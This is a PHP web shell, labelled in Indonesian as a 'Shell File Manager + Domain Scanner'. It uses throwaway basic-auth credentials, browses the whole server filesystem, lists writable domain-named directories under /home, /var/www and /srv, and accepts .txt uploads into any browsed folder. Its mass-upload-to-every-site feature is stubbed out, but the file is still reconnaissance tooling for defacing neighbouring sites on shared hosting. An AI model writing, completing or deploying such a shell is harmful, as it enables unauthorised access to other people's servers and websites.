<?php
// --- PENGATURAN KEAMANAN (WAJIB GANTI!) ---
$USERNAME = 'h';
$PASSWORD = 'h';

if (!isset($_SERVER['PHP_AUTH_USER']) || 
    !isset($_SERVER['PHP_AUTH_PW']) || 
    $_SERVER['PHP_AUTH_USER'] != $USERNAME || 
    $_SERVER['PHP_AUTH_PW'] != $PASSWORD) {
    header('WWW-Authenticate: Basic realm="File Manager"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Akses Ditolak';
    exit;
}
// --- AKHIR PENGATURAN KEAMANAN ---

// Direktori tempat domain/user umum ditemukan di lingkungan Linux/Hosting
$SCAN_DIRS = ['/home/', '/var/www/', '/srv/']; 

// --- FUNGSI PENCARIAN DOMAIN YANG FLEKSIBEL ---
function find_domains($dirs) {
    $target_paths = [];
    foreach ($dirs as $scan_dir) {
        if (is_dir($scan_dir)) {
            $items = scandir($scan_dir);
            foreach ($items as $item) {
                $full_path = $scan_dir . $item . DIRECTORY_SEPARATOR;
                // Kriteria: Harus direktori, BUKAN . atau .., dan mengandung titik (berpotensi domain)
                if ($item != '.' && $item != '..' && is_dir($full_path)) {
                    // Cek jika namanya terlihat seperti domain (misalnya: 'site.com' atau 'domain.co.id')
                    if (strpos($item, '.') !== false) {
                        // Cek apakah direktori ini dapat ditulis (writable)
                        if (is_writable($full_path)) {
                            // Target adalah direktori itu sendiri
                            $target_paths[] = $full_path;
                        }
                    }
                }
            }
        }
    }
    // Hapus duplikasi dan kembalikan path yang valid
    return array_unique($target_paths);
}


// --- FUNGSI UPLOAD MASSAL ---
if (isset($_POST['mass_upload'])) {
    // Implementasi Mass Upload DIBATALKAN karena alasan keamanan.
    $message = "🚫 **Upload Massal Dibatalkan!** Fitur ini hanya menampilkan daftar domain. Implementasi upload massal yang sebenarnya **SANGAT BERBAHAYA** dan dinonaktifkan di sini.";
}

// --- FUNGSI UPLOAD BIASA ---
if (isset($_POST['upload'])) {
    $current_dir = realpath($_POST['current_dir']);
    $target_file = $current_dir . DIRECTORY_SEPARATOR . basename($_FILES["fileToUpload"]["name"]);
    $fileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

    if($fileType != "txt") {
        $message = "❌ Gagal: Hanya file TXT yang diizinkan untuk upload biasa.";
    } elseif (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        $message = "✅ File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " berhasil diunggah ke **" . basename($current_dir) . "**.";
    } else {
        $message = "❌ Gagal mengunggah file.";
    }
}

// --- PENGATURAN PATH (Global Access) ---
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : $_SERVER['DOCUMENT_ROOT'];
$current_dir = realpath($current_dir);
if ($current_dir === false) { $current_dir = $_SERVER['DOCUMENT_ROOT']; }
$self_url = basename(__FILE__);
$files = @scandir($current_dir);
// ----------------------------------------
?>
<!DOCTYPE html>
<html>
<head>
    <title>Shell File Manager + Domain Keyword Scanner</title>
    <style>
        /* Gaya CSS */
        body { font-family: sans-serif; background-color: #f4f4f4; margin: 20px; }
        .container { max-width: 900px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h2 { border-bottom: 2px solid #ccc; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background-color: #eee; }
        .success { color: green; font-weight: bold; }
        .error { color: red; font-weight: bold; }
        .scan-result { border: 1px solid #ffcc00; background: #fffacd; padding: 10px; margin-top: 20px; }
        .upload-form { margin-top: 20px; padding: 15px; border: 1px dashed #ccc; }
        .breadcrumb { margin-bottom: 15px; font-weight: bold; }
        .breadcrumb a { text-decoration: none; color: #007bff; margin-right: 5px; }
    </style>
</head>
<body>

<div class="container">
    <h2>Shell File Manager + Domain Scanner 🕵️</h2>

    <?php if (isset($message)): ?>
        <p class="<?php echo strpos($message, '✅') !== false ? 'success' : 'error'; ?>"><?php echo $message; ?></p>
    <?php endif; ?>

    <div class="breadcrumb">
        Lokasi: 
        <?php
        $path_parts = explode(DIRECTORY_SEPARATOR, $current_dir);
        $path_link = '';
        echo '<a href="' . $self_url . '?dir=' . urlencode(DIRECTORY_SEPARATOR) . '">' . DIRECTORY_SEPARATOR . '</a>'; 
        foreach ($path_parts as $part) {
            if (empty($part)) continue;
            $path_link .= DIRECTORY_SEPARATOR . $part;
            echo '<a href="' . $self_url . '?dir=' . urlencode($path_link) . '">' . htmlspecialchars($part) . '</a>' . DIRECTORY_SEPARATOR;
        }
        ?>
    </div>
    
    <table>
        <thead>
            <tr>
                <th>Nama</th>
                <th>Ukuran</th>
                <th>Izin</th>
                <th>Tanggal Modifikasi</th>
            </tr>
        </thead>
        <tbody>
            <?php
            if ($files) {
                usort($files, function($a, $b) use ($current_dir) {
                    $is_dir_a = is_dir($current_dir . DIRECTORY_SEPARATOR . $a);
                    $is_dir_b = is_dir($current_dir . DIRECTORY_SEPARATOR . $b);
                    if ($is_dir_a == $is_dir_b) return strcasecmp($a, $b); 
                    return $is_dir_a ? -1 : 1; 
                });

                foreach ($files as $file) {
                    if ($file == '.') continue;
                    
                    $full_path = $current_dir . DIRECTORY_SEPARATOR . $file;
                    $is_dir = is_dir($full_path);
                    
                    if ($is_dir || $file == '..') {
                        $new_dir = ($file == '..') ? dirname($current_dir) : $full_path;
                        $link = $self_url . '?dir=' . urlencode($new_dir);
                    } else {
                        $link = '#';
                    }
                    
                    $icon = $is_dir ? '📁' : '📄';
                    $size = $is_dir ? 'Folder' : round(filesize($full_path) / 1024, 2) . ' KB';
                    $perms = substr(sprintf('%o', fileperms($full_path)), -4);

                    echo '<tr>';
                    echo '<td><span class="file-icon">' . $icon . '</span>';
                    echo $is_dir || $file == '..' ? '<a href="' . $link . '"><b>' . htmlspecialchars($file) . '</b></a>' : htmlspecialchars($file);
                    echo '</td>';
                    echo '<td>' . $size . '</td>';
                    echo '<td>' . $perms . '</td>';
                    echo '<td>' . date("Y-m-d H:i:s", filemtime($full_path)) . '</td>';
                    echo '</tr>';
                }
            } else {
                echo '<tr><td colspan="4">Gagal membaca direktori atau direktori tidak ditemukan.</td></tr>';
            }
            ?>
        </tbody>
    </table>

    <div class="upload-form">
        <h3>Upload File (.TXT Only) ke Folder Ini</h3>
        <form action="<?php echo $self_url . '?dir=' . urlencode($current_dir); ?>" method="post" enctype="multipart/form-data">
            <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($current_dir); ?>">
            <input type="file" name="fileToUpload" accept=".txt" required>
            <input type="submit" value="Upload TXT Ke Sini" name="upload">
        </form>
    </div>

    <div class="scan-result">
        <h3>🚀 Domain Scanner & Mass Upload</h3>
        <?php $found_paths = find_domains($SCAN_DIRS); ?>
        
        <?php if (!empty($found_paths)): ?>
            <p>✅ Ditemukan **<?php echo count($found_paths); ?>** potensi Document Root (berdasarkan nama domain/direktori) yang dapat ditulis:</p>
            <pre><?php echo implode("\n", $found_paths); ?></pre>
            
            <form action="" method="post" enctype="multipart/form-data">
                <p>Pilih file **.TXT** yang akan diunggah ke **SEMUA** lokasi di atas:</p>
                <input type="file" name="fileToMassUpload" accept=".txt" required>
                <input type="submit" value="⚠️ LAKUKAN MASS UPLOAD (.TXT)" name="mass_upload" style="background-color: red; color: white; font-weight: bold;">
                <p style="color: red;">*Saat ini, tombol ini hanya menampilkan peringatan (tidak melakukan upload aktual).</p>
            </form>
        <?php else: ?>
            <p>❌ Tidak ditemukan direktori domain yang cocok di lokasi yang diskan (`/home/`, `/var/www/`, `/srv/`).</p>
        <?php endif; ?>
    </div>

</div>

</body>
</html>